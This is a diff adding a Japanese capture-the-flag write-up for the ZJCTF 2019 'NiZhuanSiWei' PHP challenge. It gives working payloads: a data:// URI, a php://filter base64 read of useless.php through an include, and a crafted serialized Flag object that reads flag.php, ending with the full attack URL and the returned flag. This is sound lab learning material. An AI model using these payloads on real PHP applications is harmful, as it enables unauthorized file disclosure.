@@ -1351,3 +1351,130 @@ $ echo -n 'PD9waHANCg0KJGZsYWcgPSAiZmxhZ3s2ZGZmN2JlNC1jOTJiLTRhYzgtYjg2NS1lZTE0N
 $flag = "flag{6dff7be4-c92b-4ac8-b865-ee146f8e3520}";
 exit(0);
 ```
+
+# [ZJCTF 2019]NiZhuanSiWei
+
+```
+<?php  
+$text = $_GET["text"];
+$file = $_GET["file"];
+$password = $_GET["password"];
+if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
+    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
+    if(preg_match("/flag/",$file)){
+        echo "Not now!";
+        exit(); 
+    }else{
+        include($file);  //useless.php
+        $password = unserialize($password);
+        echo $password;
+    }
+}
+else{
+    highlight_file(__FILE__);
+}
+?>
+```
+
+"welcome to the zjctf”が書き込まれてるファイルがあるのかなと思って、dirsearchやgobusterなどやってみましたが特に何もなかったです。
+
+ここfile_get_contentsに注目します。
+
+file_get_contents関数とは
+> file_get_contents — ファイルの内容を全て文字列に読み込む
+
+phpのドキュメントをみてみると
+>  echo file_get_contents('php://input');
+というようにhttp以外のスキームも当たり前に使えます。
+
+ちなみにphp://inputは
+> php://input は読み込み専用のストリームで、 リクエストの body 部から生のデータを読み込むことができます。
+
+
+ここでdata://というスキームを利用します。
+> データURIスキーム（英語: data URI scheme）とは、あたかも外部リソースを読み込むのと同じように、ウェブページにインラインにデータを埋めこむ手段を提供するURIスキームである。
+
+> データをテキスト形式で埋め込むのでHTTPリクエストやヘッダのトラフィックが低減できる。データによってはそのまま埋め込むことができないためエンコードのためのオーバーヘッドが起こる（例えば、600バイトのデータをデータURIスキームで埋め込む場合、Base64でエンコードされ約800バイトになり、200バイトほどデータ量は増える）が、それでもトラフィックを軽減できる事の方が有用である。
+
+つまり、外部のファイルがなくても任意のデータを作れそうです。
+
+書式としては
+> data:[<MIME-type>][;charset=<encoding>][;base64],<data>
+
+```
+% echo -n 'welcome to the zjctf' | base64
+d2VsY29tZSB0byB0aGUgempjdGY=
+```
+
+つまり、
+```
+?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=
+```
+
+つぎに
+```
+include($file);  //useless.php
+```
+ここもクエリをそのままincludeしてるのでphp://をつかってリソースをbase64でエンコードしファイルの中身をみます。
+```
+?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=php://filter/read=convert.base64-encode/resource=useless.php
+```
+
+```
+PD9waHAgIAoKY2xhc3MgRmxhZ3sgIC8vZmxhZy5waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX190b3N0cmluZygpeyAgCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsgIAogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgCiAgICAgICAgICAgIGVjaG8gIjxicj4iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE9TRSAhLy8vQ09NRSBPTiBQTFoiKTsKICAgICAgICB9ICAKICAgIH0gIAp9ICAKPz4gIAo=
+```
+
+```
+% echo -n 'PD9waHAgIAoKY2xhc3MgRmxhZ3sgIC8vZmxhZy5waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX190b3N0cmluZygpeyAgCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsgIAogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgCiAgICAgICAgICAgIGVjaG8gIjxicj4iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE9TRSAhLy8vQ09NRSBPTiBQTFoiKTsKICAgICAgICB9ICAKICAgIH0gIAp9ICAKPz4gIAo=' | base64 -d
+<?php  
+
+class Flag{  //flag.php  
+    public $file;  
+    public function __tostring(){  
+        if(isset($this->file)){  
+            echo file_get_contents($this->file); 
+            echo "<br>";
+        return ("U R SO CLOSE !///COME ON PLZ");
+        }  
+    }  
+}  
+?>  
+```
+
+そして
+```
+$password = unserialize($password);
+```
+$passwordがそのままunserializedされてるので任意のオブジェクトを生成することができます。
+
+```php
+<?php
+
+class Flag{  //flag.php  
+    public $file="flag.php";  
+}  
+$a = new Flag();
+echo serialize($a);
+?>
+```
+
+```
+% php solve.php
+O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
+```
+
+```
+http://7f8d93d5-377c-463b-bf80-c202780bdeff.node3.buuoj.cn/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=useless.php&password=O:4:%22Flag%22:1:{s:4:%22file%22;s:8:%22flag.php%22;}
+```
+
+```
+<br>
+<h1>welcome to the zjctf</h1>
+</br>
+<br>oh u find it </br>
+<!--but i cant give it to u now-->
+<?php if(2===3){
+	return ("flag{404d0ade-fd76-4a75-85d7-1b56ad689c09}"); } 
+?>
+<br>U R SO CLOSE !///COME ON PLZ
+
